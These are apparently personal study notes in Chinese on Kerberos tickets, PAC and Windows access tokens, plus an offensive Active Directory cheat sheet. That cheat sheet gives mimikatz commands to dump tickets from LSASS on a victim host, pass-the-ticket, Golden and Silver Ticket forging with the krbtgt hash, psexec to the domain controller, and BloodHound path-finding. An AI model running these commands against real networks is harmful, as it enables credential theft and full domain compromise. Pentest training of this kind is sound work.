# TGT和TGS

## TGT（Ticket Granting Ticket）

###  作用

向域控(KDC)申请其他服务的票

### 本质

我是某个用户，这是DC给我背书的身份证

## TGS（Ticket Granting Service）

### 作用

1）访问某个具体服务

### 绑定：

1）SPN+服务账号

2）只能给那个服务使用



## LSASS里的票据能不能“拿到别的机器上用”

### 1）TGT:可用跨机器使用（在条件满足时）

从LSASS拿到某用户有效TGT

1）可用在另一个机器上用

2）把这张TGT放进一个会话

3）再去向DC申请新的TGS

这等价于我就是这个用户

### 2）TGS:通常不能随便跨机器使用

1）绑定服务SPN

2）绑定加密密钥（服务账号）

所以拿到cifs/serverA不能b访问cifs/serverB

## 为什么TGS也能横向

拿到cits/serverA的TGS

访问serverA的文件共享

但是不能用它访问别的服务

不能用它去换别的服务

## 使用这些票据硬性限制条件

1）票据还没过期

TGT/TGS都有有效期

过期=作废

2）域SID/Realm匹配

票据属于那个域

只能在那个域里用

3）放进正确的安全上下文

票据必须被加载进Kerberos会话

系统才会那他做认证
	4）服务端是否开启Kerberos

有些服务只用NTLM

那么TGS就用不上用场

## TGT有权限信息吗？

TGT/TGS不直接存权限，只存身份信息，权限是目标系统决定的。

Kerberos只负责告诉“你是谁？”

Windows本地系统负责“你能干什么？”

### 权限相关

1.域身份/组成员(Domain Admin、Domain Users)

2.本地权限(是否本机管理员)

3.系统特权(SeImpersonate、SeDebug)

TGT/TGS只和第一个身份信息有关

### TGT里有什么

用户的SID

用户的域SID

用户的PAC(Privilege Attribute Certificate)

时间戳、有效期

会话密钥

### PAC是不是权限？

PAC=用户域层面的身份属性

PAC里包含：

1）用户SID

2）用户所属的域组SID

​	Domain Users、Domain Admins、Enterprise Admins

3）其他域级属性

## TGS有权限信息吗？

TGS的作用向某个服务证明我是谁？

TGS包含：

1）同样的PAC

2）针对某个SPN的服务票据

3）服务会话密钥

## 权限在哪里决定的？

### 1）Kerberos阶段(TGT/TGS)

确认身份+域组成员

输出结果

这个人是张三

它是Domain Admins/Domain Users

### 2）目标主机本地（登录/访问时）

Windows会

1.读取票据里的PAC

2.生成Access Token

3.把

1）用户SID

2）域组SID

4.本地组、本地策略合并

5.得到最终Token

## 为什么同一个域管理员、在不同机器权限不同？

因为：

1）PAC一样（域身份一样）

2）本地组、本地策略不同

机器A：Domain Admin > 本地Administrators

机器B：Domain Admin 被移除

## TGT、TGS、Token、ACL

TGT/TGS->身份(域级)

Access Token->本地可执行权限

ACL->对具体对象的访问规则

## 总结

Kerberos票据不给权限，只携带身份，权限由目标系统根据身份生成Token决定。

## TGT在Kerberos里干嘛？

Kerberos正常流程是：

1）用户登录

2）拿到TGT(向域证明”我是我“)

3）用TGT向域控申请某个服务（TGS）

4）拿TGS访问具体服务（SMB/LDAP/HTTP等）

TGT不能直接访问服务，它的作用是换票

## 提取TGT/TGS/NTLMHash

### mimikatz

#### 1.在受害Windows机（高权）跑mimikatz（提取票据）SeDebugPrivilege

privilege::debug

sekurlsa::tickets /export //导出票据 administrator@krbtgt

下载.kirbi到kali

#### 2.注入票据

Windows上 ：kerberos::ptt ticket.kirbi

impacket-ptt domain/user -kirbi ticket.kirbi -k -no-pass

测试Klist查看票据

票据有时效,TGT最万能。结合BloodHound最猛

## 伪造票据

### Golden Ticket（伪造无限期TGT，全域任意访问）

#### impacket方式

impacket-ticketer.py

ticketer.py -nthash <krbtgt_NTHASH> -domain-sid <DOMAIN_SID> -domain <domain.local> -user-id 500 Administrator

#生成administrator.cccash文件

export KRB5CCNAME=Administrator.ccache

psexec.py domain.local/Administrator@DC_IP -k -no-pass

#### mimikatz方式

kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<krbtgt_NTHASH> /ptt

#生成ccache 用-k访问特定服务

/ptt 存在：Golden Ticket注入当前会话，当前命令行/会话直接变成域管

/ptt 不存在：只生成票据文件（.kirbi格式，保存当前目录），不自动注入，需要后续手动用kerberos::ptt ticket.kribi注入才能使用

### Silver Ticket（伪造特定TGS，只访问单服务，如CIFS）

### impacket方式

ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <domain.local> -spn cifs/DC.domain.local Administrator

## 注入的票据的内存在电脑上的生存周期

mimikatz kerberos::ptt 注入票据机制：

它会注入到当前登录会话（current logon session）的Kerberos票据缓存，不是整个系统全局，也不是仅当前进程。

详细：

1）Windows Kerberos票据缓存是per logon session（每个用户登录会话独立缓存），由LSASS进程管理。

2）mimikatz的/ptt是把Golden/Silver票据注入到当前会话的内存缓存（In-memory injection）

3）效果：当前会话下所有子进程和新进程都能自动使用这个高权票据访问域资源

4）但其他登录会话或系统其他用户不受影响

5）关闭当前会话（logout）或者跑kerberos::purge/klist purge就清理掉

## BloodHound

BloodHound是一个用”图关系“来分析active directory权限的工具，帮你分析当前身份到Domain Admin的最短路径。

它不打漏洞，不提权，不跑exploit

AD的难点

1）用户很多

2）组很多

3）机器很多

4）权限关系极其复杂

我（当前用户）->能控制谁->能登录那台机器->最终怎么到达Domain Admin.

它分两部分

### SharpHound（收集器）

1）在域内机器上跑

2）负责收集AD里的关系数据

3）收集的是

​	用户/组、谁是本地管理员、谁能RDP/WINRM、ACL/委派关系

### BloodHound（分析器）

1）在kali上跑/本地跑

2）把数据加载进图数据库

3）让你点按钮查路径比如

​	Shortest Paths to Domain Admins

### BloodHound什么时候用？

1）AS-REP/Kerberoast拿到一个普通域用户

2）登录了一台域内机器

3）枚举一圈没思路

### BloodHound

1）数据收集

​	（1）上传SharpHound.exe

​	（2）命令行运行 SharpHound.exe -c ALL --zipfilename data.zip

2）启动BloodHound GUI

​	（1）先开启Neo4j数据库

​		neo4j start

​	（2）登录:http://localhost:7474

​	（3）启动BloodHound:bloodhound

​	（4）登录GUI，上传ZIP文件导入数据

3）分析攻击路径

​	常用预置查询：

​		Shortest Paths to Domain Admins:从当前用户到域管的最短距离

​		Find all Kerberoastable Users

​		Find Pricipals with DCSync Rights

​	点击节点查看细节，手动验证路径（RBCD、Kerberoastring）